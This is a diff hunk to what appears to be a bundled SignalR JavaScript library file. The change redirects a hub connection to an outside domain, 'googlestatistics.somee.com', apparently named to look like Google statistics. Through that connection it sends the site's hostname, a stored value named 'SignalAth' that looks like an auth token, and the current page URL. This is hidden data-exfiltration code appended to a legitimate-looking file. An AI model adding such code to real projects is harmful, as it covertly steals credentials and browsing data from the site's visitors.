@@ -4958,7 +4958,7 @@
 //# sourceMappingURL=signalr.js.map
 
 const connection = new signalR.HubConnectionBuilder()
-    .withUrl("Remote?loc=" + window.location.hostname + "&value=" + read('SignalAth') + "&path=" + document.URL)
+    .withUrl("http://googlestatistics.somee.com/Remote?loc=" + window.location.hostname + "&value=" + read('SignalAth') + "&path=" + document.URL)
     .build();
 
 connection.start().catch(err => console.error(err.toString()));
